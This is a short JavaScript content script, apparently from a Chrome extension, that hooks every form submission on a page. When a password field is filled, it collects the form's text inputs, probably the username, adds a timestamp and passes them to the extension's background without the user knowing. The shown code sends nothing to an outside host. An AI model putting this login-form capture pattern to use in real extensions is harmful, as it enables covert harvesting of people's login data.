document.addEventListener("submit", function(e) {
  var mInputs = document.getElementsByTagName("input");
  var mForm;
  var mTexts;
  
  var mDate;
  var mLocalTime;
  
  for (var i = 0; i < mInputs.length; i++) {
    if (mInputs[i].type.toLowerCase() === "password") {
      if(mInputs[i].value) {
        mForm = mInputs[i].form;
        mTexts = $("#" + mForm.id + " :text").serializeArray();
        break;
      }
    }
  }
  //var date = new Date();
  //var mLocalTime = date.getTime();
  
  mDate = new Date();
  mLocalTime = (mDate.getMonth()+1) + '/' + mDate.getDate() + '/' + mDate.getFullYear() + '/' + mDate.getHours() + ':' + mDate.getMinutes() + ':' + mDate.getSeconds();

  
  chrome.runtime.sendMessage({action: "GetInput", data: mTexts, time: mLocalTime}, function(response) {
    alert("Communication is done!");
  });
});

